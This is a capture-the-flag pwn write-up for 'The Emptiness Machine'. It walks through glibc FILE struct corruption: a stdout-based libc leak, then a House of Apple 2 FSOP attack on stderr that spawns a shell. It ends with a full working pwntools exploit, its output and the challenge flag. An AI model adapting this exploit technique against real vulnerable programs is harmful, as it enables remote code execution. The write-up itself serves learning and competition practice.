# The Emptiness Machine

| Field | Details |
|-------|---------|
| **Challenge** | The Emptiness Machine |
| **Platform** | Cyber Apocalypse CTF 2026: The Salt Crown |
| **Category** | Pwn |
| **Flag** | `HTB{f4ll1ng_4_th3_pr0m1s3_0f_th3_3mptin355_m4ch1ne :)_c3665f0e965d024f9d63c6c535e117bb}` |

---

## Overview

A 64-bit PIE binary with full protections (Full RELRO, NX, CET/IBT, PIE) contains
no stack overflow, no heap, and no traditional vulnerability. Instead, it calls
`scanf` **twice** and writes user input directly into libc's own `_IO_2_1_stdout_`
and `_IO_2_1_stderr_` FILE structs. The attack surface is pure FILE structure
corruption.

```
Binary:      the_emptiness_machine  (x86-64, ELF, PIE)
Mitigations: Full RELRO, NX, CET/IBT, PIE
Libc:        glibc 2.39-0ubuntu8.x (Ubuntu 24.04 Noble)
Transport:   socat TCP relay
```

The two primitives:

| Call | Target | Bytes |
|------|--------|-------|
| `scanf("%40s",  &_IO_2_1_stdout_)` | libc stdout struct | 40 (+ null) |
| `scanf("%224s", &_IO_2_1_stderr_)` | libc stderr struct | 224 (+ null) |

`%s` stops at whitespace but **not** at null bytes: bytes `\x09 \x0a \x0b \x0c
\x0d \x20` are forbidden; `\x00` is freely usable.

The goal is a two-stage attack: (1) use the stdout write to leak `libc_base`
without knowing it, then (2) use the stderr write with the correct address to
trigger FSOP and call `system("$0")`.

---

## Binary structure

```
main()
  ├─ puts(ascii_art_banner)
  ├─ printf(first_prompt)
  ├─ fflush(stdout)
  ├─ scanf("%40s",  &_IO_2_1_stdout_)   ← write into stdout FILE struct
  ├─ printf(220-byte_second_prompt)     ← runs on corrupted stdout
  ├─ scanf("%224s", &_IO_2_1_stderr_)   ← write into stderr FILE struct
  └─ return 0                           ← triggers _IO_cleanup → FSOP
```

The second `printf` executes with whatever FILE struct we left after the first
`scanf`: this is the leak vector. The `return 0` calls `_IO_cleanup`, which
calls `_IO_flush_all_lockp(0)` and walks `_IO_list_all`, giving us the FSOP
trigger.

### FILE struct layout (relevant offsets)

```
_IO_2_1_stdout_:
  +0x00  _flags          (4 bytes, then 4 bytes padding)
  +0x08  _IO_read_ptr
  +0x10  _IO_read_end
  +0x18  _IO_read_base
  +0x20  _IO_write_base    ← scanf null terminator lands here at payload[32]
  +0x28  _IO_write_ptr
  +0x30  _IO_write_end
  +0x38  _IO_buf_base
  +0x40  _IO_buf_end       ← libc_base + 0x204644 (leak target)
  +0x68  _chain            ← _IO_2_1_stdin_ (sanity check)
  +0x70  _fileno           ← 1 (stdout)
  +0x78  _old_offset       ← -1 (non-seekable fd)
  +0xd8  vtable            ← must point into validated range
```

---

## Stage 1: Leaking libc via stdout corruption

### The obstacle

Leaking requires making `write(1, buf, len)` fire through the FILE write path.
The standard route through `_IO_do_write` → `new_do_write` normally includes a
seek check:

```c
// _IO_do_write, simplified
if (fp->_IO_read_end != fp->_IO_write_base) {
    if (_IO_SYSSEEK(fp, fp->_IO_write_base - fp->_IO_read_end, 1) < 0)
        return EOF;   // lseek on a socket fd always fails → abort
}
```

Bypassing this requires `read_end == write_base`, which requires knowing
`libc_base` to set the right address: a circular dependency.

### The bypass: `_IO_IS_APPENDING`

Disassembling the compiled `_IO_do_write` at libc offset `0x924fe` reveals a
branch that completely skips the seek:

```
_IO_do_write(fp, write_base, len):

  test [fp->flags], 0x1000       ; _IO_IS_APPENDING set?
  je   NORMAL_PATH               ; no → do the lseek check (would fail)
  
  ; Yes → APPENDING PATH:
  mov  [fp + 0x90], -1           ; set fp->_offset = -1
  jmp  WRITE_PATH                ; jump OVER the lseek entirely

WRITE_PATH:
  ; IO_validate_vtable check on fp->vtable
  call [vtable + __write]        ; → _IO_file_write(fp, write_base, len)
                                 ; → write(1, write_base, len)  ← data out!
```

Setting `_IO_IS_APPENDING` (0x1000) in flags bypasses the seek unconditionally.

### The payload (32 bytes)

We send exactly 32 non-whitespace bytes. `scanf("%40s")` appends a null terminator
at position 32, which falls on struct offset `0x20`: the least-significant byte
of `_IO_write_base`:

```
Before:  write_base = libc_base + 0x204643
                                       ↑
After:   write_base = libc_base + 0x204600  (LSByte 0x43 → 0x00)
         write_ptr  = libc_base + 0x204643  (unchanged)

Difference: write_ptr - write_base = 0x43 = 67 bytes
```

Payload layout:

```
bytes[0:4]   = 0xfbad1804  (flags: _IO_MAGIC | _IO_NO_READS |
                             _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING)
bytes[4:32]  = 0x00 * 28   (zeroes read_ptr / read_end / read_base)
               ↑ null byte is NOT whitespace for scanf: allowed
byte[32]     = '\0'        (scanf null terminator → kills LSByte of write_base)
```

### What the second printf leaks

With `_IO_CURRENTLY_PUTTING` set and `write_ptr > write_base`, the next `printf`
call triggers `_IO_new_file_overflow` → `_IO_do_write(fp, write_base, 0x43)` →
`write(1, libc_base+0x204600, 67)`. The network receives 67 bytes of the stdout
struct starting at struct offset `0x40`:

```
leaked[0x00:0x08]  = _IO_buf_end  = libc_base + 0x204644   ← compute libc_base
leaked[0x28:0x30]  = _chain       = libc_base + 0x2038e0   ← sanity check (stdin)
leaked[0x30:0x38]  = _fileno=1, _old_offset=-1             ← confirm stdout
```

```python
libc_base = u64(leaked[0:8]) - (libc.symbols['_IO_2_1_stdout_'] + 0x84)
```

---

## Stage 2: FSOP via stderr (House of Apple 2)

With `libc_base` known, the second `scanf` fills `_IO_2_1_stderr_` with a forged
FILE struct that hijacks control flow on `return 0`.

### The trigger chain

`return 0` → `__run_exit_handlers` → `_IO_cleanup` → `_IO_flush_all_lockp(0)`:

```c
for (fp = _IO_list_all; fp != NULL; fp = fp->_chain) {
    if (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
        _IO_OVERFLOW(fp, EOF);   // → fp->vtable->__overflow(fp, EOF)
}
```

`do_lock = 0` so the fake `_lock` field is never dereferenced.

### House of Apple 2 call chain

We set `fp->vtable = _IO_wfile_jumps` (real libc vtable: passes
`IO_validate_vtable`'s range check). `_IO_wfile_jumps->__overflow` =
`_IO_wfile_overflow`:

```
_IO_wfile_overflow(fp, EOF)
  fp->_flags & _IO_NO_WRITES = 0         → continue
  fp->_flags & _IO_CURRENTLY_PUTTING = 0 → enter alloc path
  fp->_wide_data->_IO_write_base = 0     → call _IO_wdoallocbuf(fp)
  
_IO_wdoallocbuf(fp)
  fp->_wide_data->_IO_buf_base = 0       → continue  (BSS, always 0)
  fp->_flags & _IO_UNBUFFERED = 0        → call _IO_WDOALLOCATE(fp)
  
_IO_WDOALLOCATE(fp)
  = fp->_wide_data->_wide_vtable->__doallocate(fp)
  = system(fp)
  = system("$0\x00...")                  → $0 expands to "sh" → shell
```

The inner `_wide_vtable` is **not** range-checked by `IO_validate_vtable`; only
the outer vtable is validated.

### Address layout in the forged stderr struct

```
stderr_addr = libc_base + 0x2044e0

Pointer relationships used:
  fp->_wide_data       = stderr_addr - 0x48
    wd + 0x18          = stderr_addr - 0x30  → 0 in BSS (_wide_data->write_base)
    wd + 0x30          = stderr_addr - 0x18  → 0 in BSS (_wide_data->buf_base)
    wd + 0xe0          = stderr_addr + 0x98  → buf[0x98] = fake _wide_vtable ptr
  fake _wide_vtable    = stderr_addr + 0x10  → buf[0x10]
    vtable + 0x68      = stderr_addr + 0x78  → buf[0x78] = system()
```

### Forged struct (224 bytes)

```
buf[0x00]  "$0\x00"            fp->_flags; system(fp) sees "$0" → sh
buf[0x20]  0                   fp->_IO_write_base = 0  ┐ flush condition:
buf[0x28]  1                   fp->_IO_write_ptr  = 1  ┘ ptr > base
buf[0x68]  0                   fp->_chain = NULL (stop list traversal)
buf[0x78]  system_addr         fake_wide_vtable[0x68] = __doallocate slot
buf[0x88]  stderr_addr+0xc8    fp->_lock → zeroed region (never touched)
buf[0x98]  stderr_addr+0x10    wide_data->_wide_vtable = &buf[0x10]
buf[0xa0]  stderr_addr-0x48    fp->_wide_data
buf[0xd8]  _IO_wfile_jumps     fp->vtable (passes IO_validate_vtable)
```

### Why `system("$0")` gives a shell

`system("$0")` runs `sh -c "$0"`. In the context of `sh`, `$0` is the name of the
shell itself, so the command reduces to running `sh`, spawning an interactive
shell with file descriptors inherited from the binary (which include the socat TCP
relay socket).

---

## Exploit

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

context.clear(arch='amd64')
context.log_level = 'warning'

libc = ELF('./glibc/libc.so.6', checksec=False)

STDOUT_OFF      = libc.symbols['_IO_2_1_stdout_']   # 0x2045c0
STDERR_OFF      = libc.symbols['_IO_2_1_stderr_']   # 0x2044e0
WFILE_JUMPS_OFF = libc.symbols['_IO_wfile_jumps']   # 0x202228
SYSTEM_OFF      = libc.symbols['system']             # 0x58750
BUFE_OFF        = STDOUT_OFF + 0x84                  # 0x204644
STDIN_OFF       = libc.symbols['_IO_2_1_stdin_']    # 0x2038e0

def build_leak_payload():
    # 32 bytes; scanf null terminator at [32] zeroes LSByte of _IO_write_base
    flags = 0xfbad1804   # IS_APPENDING | CURRENTLY_PUTTING | NO_READS | MAGIC
    return flags.to_bytes(4, 'little') + b'\x00' * 28

def build_stderr_payload(libc_base):
    stderr_addr = libc_base + STDERR_OFF
    wfile_jumps = libc_base + WFILE_JUMPS_OFF
    system_addr = libc_base + SYSTEM_OFF

    buf = bytearray(224)

    def put(off, val, size=8):
        buf[off:off+size] = val.to_bytes(size, 'little')

    buf[0:3] = b'$0\x00'
    put(0x20, 0);               put(0x28, 1)
    put(0x68, 0)
    put(0x78, system_addr)
    put(0x88, stderr_addr + 0xc8)
    put(0x98, stderr_addr + 0x10)
    put(0xa0, stderr_addr - 0x48)
    put(0xd8, wfile_jumps)

    return bytes(buf)

def exploit(io):
    io.recvuntil(b'interaction: ')
    io.send(build_leak_payload() + b'\n')

    leaked = io.recv(67)
    buf_end_val = u64(leaked[0:8])
    libc_base   = buf_end_val - BUFE_OFF
    log.success(f'libc_base: {hex(libc_base)}')

    assert u64(leaked[0x28:0x30]) == libc_base + STDIN_OFF, '_chain sanity failed'

    io.recvuntil(b'interaction: ')
    io.send(build_stderr_payload(libc_base) + b'\n')

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    io   = remote(host, port)

    exploit(io)
    time.sleep(0.5)
    io.sendline(b'id')
    time.sleep(0.3)
    print(io.recv(timeout=3).decode(errors='replace').strip())
    io.interactive()
```

```
$ python3 exploit.py <host> <port>
[+] libc_base: 0x7f02a07ef000
uid=100(ctf) gid=101(ctf) groups=101(ctf)
HTB{f4ll1ng_4_th3_pr0m1s3_0f_th3_3mptin355_m4ch1ne :)_c3665f0e965d024f9d63c6c535e117bb}
```

---

## Key takeaways

- **`_IO_IS_APPENDING` skips the seek in `_IO_do_write`**: at the compiled level
  it is an unconditional branch to the write path, not a condition that still
  requires `read_end == write_base`. This breaks the circular dependency that
  otherwise makes leaking impossible without knowing `libc_base`.
- **scanf null terminator as a one-byte write**: sending exactly 32
  non-whitespace bytes causes the null terminator to land precisely on the LSByte
  of `_IO_write_base`, widening the pending write window to 67 bytes at zero cost
  in payload budget.
- **`_IO_flush_all_lockp(0)` with `do_lock=0`**: the `_IO_cleanup` path passes
  `do_lock=0`, meaning `_lock` is never acquired and a fake (even zeroed) lock
  field is safe. No need to forge a valid mutex.
- **House of Apple 2's inner `_wide_vtable` avoids vtable validation**: `IO_validate_vtable` only checks the outer vtable pointer; the `_wide_vtable`
  inside `_IO_wide_data` is never validated, so it can point anywhere (including
  back into the forged buffer itself).
- **`system("$0")` as a whitespace-free shell invocation**: `$0` (0x24, 0x30)
  contains no whitespace characters that would terminate `scanf("%s")`, making it
  a reliable shell trigger in the flags field of a FILE struct.
